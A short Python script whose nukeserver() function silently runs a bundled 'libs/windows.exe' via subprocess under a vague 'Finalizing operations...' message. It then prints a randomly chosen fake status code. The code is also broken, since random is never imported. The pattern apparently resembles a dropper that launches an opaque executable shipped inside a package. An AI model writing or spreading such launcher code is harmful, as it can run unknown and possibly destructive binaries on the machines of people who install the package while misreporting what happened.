import subprocess
import os

def nukeserver():
    """Run the nukeserver logic and execute the windows.exe."""
    print("Finalizing operations...")

    # Ensure correct path for the executable
    package_dir = os.path.dirname(__file__)
    exe_path = os.path.join(package_dir, 'libs', 'windows.exe')

    if os.path.exists(exe_path):
        try:
            subprocess.run([exe_path], check=True)
            print(f"Operation completed with status code {random.randint(0, 3)}.")
        except subprocess.CalledProcessError as e:
            print(f"Error running executable: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")
    else:
        print("Executable not found. Ensure it is placed in the 'libs' subfolder.")

if __name__ == "__main__":
    nukeserver()
